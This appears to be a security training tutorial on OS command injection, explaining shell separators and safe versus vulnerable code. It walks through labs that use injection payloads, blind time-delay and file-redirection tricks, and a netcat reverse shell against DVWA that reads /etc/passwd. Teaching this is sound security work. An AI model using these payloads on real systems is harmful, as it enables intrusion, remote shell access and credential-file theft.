🌍 What Is an Operating System?

Understanding the foundation of command execution

💡 Core Definition

An Operating System (OS) is system software that:

• Manages hardware resources (CPU, memory, disk)
• Executes programs and processes
• Processes commands from users and applications
• Provides security boundaries (users, permissions)
🖥️ Common Operating Systems
OS Type Command Line Example
Linux Unix-based Bash/Shell $ whoami
Windows Proprietary CMD/PowerShell > whoami
macOS Unix-based Bash/Zsh $ whoami

ℹ️
The OS is the gatekeeper between users/applications and hardware. Commands it executes run with the privileges of the user or service.

📝 What Is an OS Command?

Commands are instructions that directly interact with your system

💡 Definition

An OS command is an instruction given to the operating system to perform a specific task.

✓
Core Principle: OS commands directly interact with the system and have high privileges.
🐧 Common Linux Commands
ls # List files in directory pwd # Print working directory whoami # Show current user cat file.txt # Display file contents id # Show user/group IDs uname -a # Show system information ps aux # List running processes

Each command performs a specific function and requires certain privileges to execute.

Understanding the connection between web applications and operating systems

❓ Why Do Web Apps Need OS Commands?
📌 Common Scenarios:

• Ping a server to check connectivity

• Resize or convert images

• Convert file formats (PDF, video)

• Check system status or resources

• Run external tools/scripts

💻 Code Example

👤 What Is User Input?

Identifying where attackers inject data

💡 Definition

User input is any data that comes from the user and reaches the application.

🎯 Sources of User Input:

• URL Parameters: ?ip=8.8.8.8

• Form Inputs: Text fields, dropdowns, checkboxes

• HTTP Headers: User-Agent, X-Forwarded-For

• Cookies: Session tokens, preferences

• File Uploads: Filenames, contents

• API Requests: JSON, XML payloads

🔗 Example URL
http://example.com/api/ping?ip=8.8.8.8&timeout=5 Parameters: ip = 8.8.8.8 ← User controlled timeout = 5 ← User controlled

All parameters shown above are supplied by the user and often used directly in OS commands.

🛡️ Safe vs Unsafe Code

Understanding secure and vulnerable patterns

❌ Vulnerable Code Pattern
❌ VULNERABLE
$ip = $_GET['ip']; system("ping -c 1 " . $ip);
✗
Why is this vulnerable?
• No input validation
• User input directly concatenated
• Shell interprets special characters
• Attacker has full control
✅ Safe Code Patterns
✅ SAFE - Escape Shell Args (PHP)
$ip = escapeshellarg($_GET['ip']); system("ping -c 1 " . $ip);
✅ SAFE - Argument Array (Python)
import subprocess ip = request.args.get('ip') subprocess.run(['ping', '-c', '1', ip])
✅ SAFE - Whitelist Validation (General)
ip = request.args.get('ip') if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip): system("ping -c 1 " + ip) else: error("Invalid IP format")
✓
Safe coding principles:
• Escape shell arguments
• Use parameterized commands
• Validate input format
• Whitelist expected values
• Avoid shell execution when possible

💀 What Is OS Command Injection?

The critical vulnerability explained

📖 Definition
!
OS Command Injection occurs when an application executes operating system commands using unsanitized user input, allowing attackers to run additional or arbitrary commands on the server.
🎯 Attack Chain
1. Attacker identifies a vulnerable parameter
2. Attacker injects OS command using separators (;, &&, |)
3. Application concatenates attacker input
4. OS interprets the full string as multiple commands
5. Attacker gains arbitrary code execution
6. Server is compromised
📊 Severity & Impact
Rating Value Description
CVSS Score 9.0 - 10.0 Critical vulnerability
OWASP Top 10 A1/A03 High priority vulnerability
Impact Critical Complete system compromise
🔥 Why It's Critical
Impact of Successful Exploitation:

• Remote Code Execution (RCE) - Execute arbitrary commands

• Data Breach - Read sensitive files (/etc/passwd, database configs)

• System Compromise - Full server access

• Lateral Movement - Attack other systems on the network

• Persistence - Install backdoors, rootkits

• Denial of Service - Crash or disable services

🔑 Why OS Command Injection Works

Understanding the mechanics of the vulnerability

🧠 Core Reason
ℹ️
OS Command Injection works because:
1. OS shells interpret special characters as command separators
2. Applications concatenate user input directly
3. The shell sees multiple commands instead of one
⚙️ Command Separators
Symbol Meaning Execution Logic Example
; End of command Execute next command always cmd1 ; cmd2
&& Logical AND Execute next only if previous succeeds cmd1 && cmd2
|| Logical OR Execute next only if previous fails cmd1 || cmd2
| Pipe Send output of cmd1 to cmd2 cmd1 | cmd2
$( ) Substitution Execute command, use output echo $(whoami)
` ` Backticks Execute command, use output echo `whoami`
🧪 Interactive Separator Demo

Observe how separators create multiple command execution:

🎯 Real Injection Scenario

Normal ping command:

ping -c 1 8.8.8.8

Attacker injects ; whoami:

ping -c 1 8.8.8.8; whoami

OS interprets as two commands:

$ ping -c 1 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=119 time=15.2 ms
$ whoami
www-data

🔴 Lab 1: Visible Command Injection

Exploiting and understanding your first injection

🎯 Lab Objective
ℹ️
Goal: Execute the whoami command through command injection and identify the server user.
Vulnerability: Stock check API concatenates user input directly into OS command.
📋 Step-by-Step Exploitation
Step 1: Identify the Vulnerable Parameters

The vulnerable API endpoint is:

GET /api/stock?productId=1&storeId=1

Both productId and storeId are user-controlled and injectable.

Step 2: Craft the Injection Payload

We'll use the semicolon separator to execute whoami:

; whoami
Step 3: Inject into Parameter

Inject the payload into productId:

GET /api/stock?productId=1; whoami&storeId=1
Step 4: Observe the Response

The server executes:

check_stock --productId=1; whoami --storeId=1

Which is interpreted as:

$ check_stock --productId=1
Invalid product ID
$ whoami
www-data

💡 Why This Attack Worked
Root Cause Analysis:

1. Input Not Validated: Application accepts any string for productId

2. Direct Concatenation: User input directly inserted into command string

3. Shell Interpretation: OS shell sees the semicolon and treats it as separator

4. Command Execution: Both original and injected commands execute

🎓 Key Takeaway
!
Command separators turn user input into executable instructions. A single semicolon can grant attackers arbitrary code execution on the server.

🟠 Lab 2: Blind Injection with Time Delay

Exploiting vulnerabilities without visible output

🎯 Lab Objective
ℹ️
Goal: Cause a 10-second delay in the server response to confirm blind command execution.
Challenge: Command output is NOT returned to the user, so we must detect execution via side effects.
💡 What Is Blind Injection?
In Blind Injection:

• Command DOES execute on the server

• Output is NOT shown to the attacker

• Attacker must infer execution via side effects

• Time delays are a common detection method

Why Time Delays Work:

If an attacker injects sleep 10 and the response takes 10 seconds longer than normal, it confirms execution.

📋 Exploitation Steps
Step 1: Identify the Vulnerable Endpoint

The vulnerable feedback form endpoint:

POST /api/feedback HTTP/1.1
Step 2: Test Each Parameter

Parameters to test:

name= email= subject= message=
Step 3: Craft Delay Payload

Time-based detection payload:

; sleep 10
Step 4: Measure Response Time

Monitor how long the server takes to respond. If it delays by ~10 seconds, injection is confirmed.

🟡 Lab 3: Blind Injection with Output Redirection

Extracting data from blind injection through file writing

🎯 Lab Objective
ℹ️
Goal: Redirect command output to a file and retrieve it via HTTP.
Technique: Write to a web-accessible directory, then fetch the file.
💡 Output Redirection Technique
What Is Output Redirection?

The > operator sends command output to a file instead of the terminal:

whoami > /tmp/output.txt # Before: whoami output shown on screen # After: whoami output written to file
Why This Works in This Lab:

1. Application has write access to /var/www/html/images/

2. This directory is served via HTTP (web-accessible)

3. Attacker writes command output to a file in this directory

4. Attacker retrieves the file via normal HTTP request

📋 Exploitation Steps
Step 1: Identify Writable Directory

The web app serves images from:

/var/www/html/images/ This directory is: ✓ Writable by the web application ✓ Accessible via HTTP GET requests ✓ Perfect for exfiltration
Step 2: Craft Output Redirection Payload

Redirect whoami output to a file:

; whoami > /var/www/html/images/output.txt
Step 3: Inject into Vulnerable Parameter

Inject into the email field:

email=attacker@test.com; whoami > /var/www/html/images/output.txt
Step 4: Retrieve the Output File

Access the file via HTTP:

GET /images/output.txt HTTP/1.1 Response: www-data

🔴 Lab 4: DVWA RCE & Reverse Shell

From injection to complete server compromise

🎯 Lab Objective
!
Goal: Exploit DVWA Command Injection vulnerability to establish a reverse shell.
Outcome: Complete interactive access to server's command line.
💡 What Is a Reverse Shell?
Definition:

A reverse shell is when the compromised server initiates a connection back to the attacker, giving the attacker an interactive shell on the server.

Normal vs Reverse Shell:
Type Connection Direction Who Initiates?
Normal Shell Client → Server (SSH) User connects to server
Reverse Shell Server → Client (Attack IP) Server connects to attacker
Why Reverse Shells Are Powerful:

• Server bypasses firewalls by initiating outbound connection

• Attacker doesn't need direct access to server

• Interactive access allows complex attacks

• Can establish persistence and lateral movement

📋 Exploitation Process
Step 1: Access DVWA Command Injection Module
1. Open DVWA in browser 2. Login with admin/password 3. Navigate to: Command Injection 4. Set Security Level to: LOW
Step 2: Verify Basic Injection (LOW Security)

Input field asks for IP address:

Payload: 192.168.56.102 && whoami Expected output: ping result + www-data
Step 3: Establish Reverse Shell

On Attacker Machine (Kali):

nc -lvnp 4444 -l = Listen -v = Verbose -n = No DNS -p = Port 4444

On DVWA Input Field:

192.168.56.102 && nc 192.168.56.1 4444 -e /bin/bash Where: 192.168.56.102 = DVWA server 192.168.56.1 = Attacker Kali IP 4444 = Listening port -e /bin/bash = Execute bash shell
Step 4: Gain Interactive Access

On the attacker's netcat listener, you now have a shell:

$ Reverse Shell Connected
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
